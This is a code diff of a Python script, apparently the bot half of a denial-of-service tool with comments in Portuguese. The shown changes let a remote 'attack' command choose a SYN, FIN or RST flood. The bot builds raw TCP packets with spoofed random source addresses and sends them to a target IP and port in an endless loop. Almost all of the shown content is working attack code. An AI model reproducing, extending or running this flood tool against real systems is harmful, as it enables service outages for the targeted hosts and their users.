@@ -67,13 +67,9 @@ def checksum_tcp(source_ip,dest_ip,tcp_header):
 
     return checksum(psh)
 
-def montaPacote(seqnumber,source_ip, dest_ip, source_port, dest_port, window_size, id):
+def montaPacote(seqnumber,attack_type,source_ip, dest_ip, source_port, dest_port, window_size, id):
     # Construcao do pacote
     packet = '';
-
-    # IP's de origem e destino
-    source_ip = source_ip
-    dest_ip = dest_ip
 
     # ======== Campos do cabecalho IP ========
 
@@ -133,9 +129,9 @@ def montaPacote(seqnumber,source_ip, dest_ip, source_port, dest_port, window_siz
     doff = 5
 
     # Flags de controle
-    fin = 0
-    syn = 1  # Aqui ativamos a flag do SYN
-    rst = 0
+    fin = int(attack_type == "FIN")
+    syn = int(attack_type == "SYN")
+    rst = int(attack_type == "RST")
     psh = 0
     ack = 0
     urg = 0
@@ -185,7 +181,7 @@ def attack(raw_socket,attack_type, local_ip, dest_ip, dest_port):
     print "=== " + local_ip + " Attacking " + dest_ip + " on " + dest_port + " ==="
     # TODO: Implementar opcao de ataque de acordo com attack_type
     while(1):
-        packet = montaPacote(0,get_random_ip(), dest_ip,  randint(1800,65533),int(dest_port), 5840, 54321)
+        packet = montaPacote(0,attack_type,get_random_ip(), dest_ip,  randint(1800,65533),int(dest_port), 5840, 54321)
         raw_socket.sendto(packet,(dest_ip,0))
         sleep(1)
         print "sending attack"
@@ -239,11 +235,12 @@ else:
                 alive = 0
             # Comando de ataque
             if data2.startswith("attack"):
-                dest_ip = data2.split()[1]
-                dest_port = data2.split()[2]
+                attack_type = data2.split()[1]
+                dest_ip = data2.split()[2]
+                dest_port = data2.split()[3]
                 # Novo processo para ataque
                 try:
-                    proc = Process(target=attack,args=(raw_s,"SYN",get_random_ip(),dest_ip,dest_port))
+                    proc = Process(target=attack,args=(raw_s,attack_type,get_random_ip(),dest_ip,dest_port))
                     proc.start()
                     signal = receivemessage(s)
                     if signal.rstrip() == "stop":
